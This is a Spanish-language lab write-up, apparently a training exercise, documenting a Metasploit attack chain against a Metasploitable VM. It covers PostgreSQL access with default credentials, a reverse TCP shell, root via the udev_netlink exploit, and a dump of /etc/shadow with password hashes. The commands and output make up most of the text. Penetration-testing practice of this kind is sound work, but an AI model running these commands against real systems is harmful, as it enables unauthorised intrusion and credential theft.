# ✅ Explotación Remota de PostgreSQL y Escalada de Privilegios en Metasploitable

---

## 1️⃣ Configuración y Ejecución del Módulo

Se utilizó el módulo de Metasploit para explotar el servicio **PostgreSQL** expuesto en el objetivo.

```text
msf > use exploit/linux/postgres/postgres_payload
[*] Using configured payload linux/x86/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
```

### 🔹 Configuración de Parámetros del Objetivo

```text
msf exploit(linux/postgres/postgres_payload) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101

msf exploit(linux/postgres/postgres_payload) > set USERNAME postgres
USERNAME => postgres

msf exploit(linux/postgres/postgres_payload) > set PASSWORD postgres
PASSWORD => postgres
```

### 🔹 Configuración del Payload y Listener

```text
msf exploit(linux/postgres/postgres_payload) > set PAYLOAD linux/x86/shell_reverse_tcp
PAYLOAD => linux/x86/shell_reverse_tcp

msf exploit(linux/postgres/postgres_payload) > set LHOST 192.168.56.104
LHOST => 192.168.56.104

msf exploit(linux/postgres/postgres_payload) > set LPORT 4444
LPORT => 4444
```

### 🔹 Ejecución del Exploit

```text
msf exploit(linux/postgres/postgres_payload) > run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] 192.168.56.101:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu
[*] Uploaded as /tmp/ItIbokyF.so
[*] Command shell session 1 opened (192.168.56.104:4444 -> 192.168.56.101:53199)
```

---

## 🔹 Verificación de Acceso

```bash
whoami
```

```text
postgres
```

Se confirma acceso remoto como el usuario **postgres**.

### 🔹 Envío de la Sesión a Segundo Plano

```text
^Z
Background session 1? [y/N]  y
```

---

## 2️⃣ Verificación de Sesiones Activas

```text
msf > sessions
```

```text
Active sessions
===============

  Id  Name  Type             Information  Connection
  --  ----  ----             -----------  ----------
  1         shell x86/linux               192.168.56.104:4444 ->
                                          192.168.56.101:53199
```

---

## 3️⃣ Escalada de Privilegios Local (udev_netlink)

Se utilizó un exploit local para escalar privilegios a **root**.

### 🔹 Carga del Exploit

```text
msf > use exploit/linux/local/udev_netlink
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
```

### 🔹 Configuración de Sesión y Listener

```text
msf exploit(linux/local/udev_netlink) > set SESSION 1
SESSION => 1

msf exploit(linux/local/udev_netlink) > set LHOST 192.168.56.104
LHOST => 192.168.56.104
```

### 🔹 Ejecución del Exploit

```text
msf exploit(linux/local/udev_netlink) > run
[*] Started reverse TCP handler on 192.168.56.104:4444 
[*] Attempting to autodetect netlink pid...
[+] Found netlink pid: 2421
[*] Writing payload executable to /tmp/KEKHsAGZrg
[*] Writing exploit executable to /tmp/kDaToTDiSh
[*] chmod'ing and running it...
[*] Sending stage...
[*] Meterpreter session 2 opened (192.168.56.104:4444 -> 192.168.56.101:53200)
```

---

## 4️⃣ Validación de Privilegios

### 🔹 Apertura de Shell

```text
meterpreter > shell
Process 5049 created.
Channel 1 created.
```

### 🔹 Confirmación de Acceso Root

```bash
whoami
```

```text
root
```

```bash
id
```

```text
uid=0(root) gid=0(root)
```

---

## 🔹 Enumeración del Host

```bash
hostname
```

```text
metasploitable
```

```bash
pwd
```

```text
/
```

---

## 🔹 Acceso al Archivo Shadow

```bash
cat /etc/shadow
```

```text
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
...
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
...
```

Se confirma acceso completo a credenciales del sistema.

### 🔹 Envío de la Shell a Segundo Plano

```text
^Z
Background channel 1? [y/N]  y
```

---

## 5️⃣ Estado Final de las Sesiones

```text
msf > sessions
```

```text
Active sessions
===============

  Id  Name  Type                 Information            Connection
  --  ----  ----                 -----------            ----------
  1         shell x86/linux                              192.168.56.104:4444 ->
                                                         192.168.56.101:53199

  2         meterpreter x86/linux  root @ metasploitable 192.168.56.104:4444 ->
                                  .localdomain           192.168.56.101:53200
```

---

## ✅ Conclusión

El servicio **PostgreSQL** permitió acceso remoto mediante credenciales por defecto, lo que facilitó la obtención de una shell como el usuario **postgres**. Posteriormente, se explotó una vulnerabilidad local (**udev_netlink**) para escalar privilegios hasta **root**, logrando el **compromiso total del sistema**. Esto demuestra una cadena completa de ataque: acceso remoto → post-explotación → escalada de privilegios → control absoluto del host.


